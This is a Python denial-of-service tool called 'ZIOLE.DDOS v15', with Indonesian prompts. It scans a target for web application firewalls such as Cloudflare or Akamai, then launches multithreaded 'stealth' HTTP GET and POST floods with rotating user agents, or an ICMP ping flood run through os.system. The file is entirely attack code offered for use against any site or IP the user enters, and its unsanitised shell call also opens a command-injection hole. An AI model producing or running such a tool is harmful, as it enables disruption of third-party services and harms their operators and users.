#!/usr/bin/env python3
# ZIOLE.DDOS v15 - FULL LAYER + WAF SCAN + STEALTH MODE

import os
import requests
import threading
import time
import socket
import random
from urllib.parse import urlparse

RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
RESET = '\033[0m'

def print_banner():
    print(f"{CYAN}ZIOLE.DDOS v15 - L3-L7 + Stealth + WAF Scan Support{RESET}")

def resolve_target(target):
    if target.startswith("http"):
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        return target, host, port
    else:
        return f"http://{target}", target, 80

def detect_firewall(url):
    try:
        print(f"{CYAN}[•] Scan firewall di {url}...{RESET}")
        headers = {"User-Agent": "Ziole-Firewall-Scan"}
        res = requests.get(url, headers=headers, timeout=5)
        server = res.headers.get("Server", "").lower()
        waf_detected = []

        if "cloudflare" in server or "cf-ray" in res.headers:
            waf_detected.append("Cloudflare")
        if "sucuri" in server or "x-sucuri-id" in res.headers:
            waf_detected.append("Sucuri")
        if "akamai" in server or "akamai" in res.text.lower():
            waf_detected.append("Akamai")
        if "blazingfast" in server:
            waf_detected.append("BlazingFast")

        if waf_detected:
            print(f"{RED}[!] FIREWALL TERDETEKSI: {', '.join(waf_detected)}{RESET}")
        else:
            print(f"{GREEN}[✓] Tidak ada firewall terdeteksi.{RESET}")
    except Exception as e:
        print(f"{RED}[x] Gagal deteksi firewall: {e}{RESET}")

def stealth_get(url, host, port, threads, duration):
    agents = ["Mozilla/5.0", "Chrome/91.0", "Safari/537.36", "Ziole/1.0"]
    end = time.time() + duration
    def attack():
        while time.time() < end:
            try:
                headers = {
                    "User-Agent": random.choice(agents),
                    "Accept": "text/html",
                    "Connection": "keep-alive"
                }
                requests.get(url, headers=headers, timeout=3)
                print(f"{GREEN}[✓] STEALTH GET -> {host}{RESET}")
                time.sleep(2)
            except: pass
    for _ in range(threads): threading.Thread(target=attack, daemon=True).start()
    while time.time() < end: time.sleep(1)

def stealth_post(url, threads, duration):
    end = time.time() + duration
    payload = {"key": "value"}
    def attack():
        while time.time() < end:
            try:
                headers = {"Content-Type": "application/json"}
                requests.post(url, json=payload, headers=headers, timeout=3)
                print(f"{GREEN}[✓] STEALTH POST -> {url}{RESET}")
                time.sleep(2)
            except: pass
    for _ in range(threads): threading.Thread(target=attack, daemon=True).start()
    while time.time() < end: time.sleep(1)

def icmp_flood(ip, threads, duration):
    print(f"{CYAN}[*] ICMP Flood (ping) started...{RESET}")
    end = time.time() + duration
    def attack():
        while time.time() < end:
            os.system(f"ping -c 1 {ip} > /dev/null")
            print(f"{GREEN}[✓] ICMP -> {ip}{RESET}")
    for _ in range(threads): threading.Thread(target=attack, daemon=True).start()
    while time.time() < end: time.sleep(1)

def main():
    try:
        print_banner()
        print("\nPilih MODE SERANGAN:")
        print("0) Scan Firewall (WAF Detector)")
        print("10) Stealth GET (L7)")
        print("11) Stealth POST (L7)")
        print("9) ICMP Ping Flood (L3)")

        mode = input("Pilih Mode (0–11): ").strip()
        target = input("Target (IP atau URL): ").strip()
        url, host, port = resolve_target(target)

        if mode == "0":
            detect_firewall(url)
        else:
            duration = int(input("Durasi (detik): "))
            threads = int(input("Jumlah thread: "))

            if mode == "9": icmp_flood(host, threads, duration)
            elif mode == "10": stealth_get(url, host, port, threads, duration)
            elif mode == "11": stealth_post(url, threads, duration)
            else:
                print(f"{RED}[x] Mode tidak valid!{RESET}")

        print(f"{GREEN}\n[✓] Proses selesai untuk {host}:{port}{RESET}")

    except KeyboardInterrupt:
        print(f"\n{RED}[x] Dibatalkan oleh user.{RESET}")
    except Exception as e:
        print(f"{RED}[x] ERROR: {e}{RESET}")

if __name__ == "__main__":
    main()
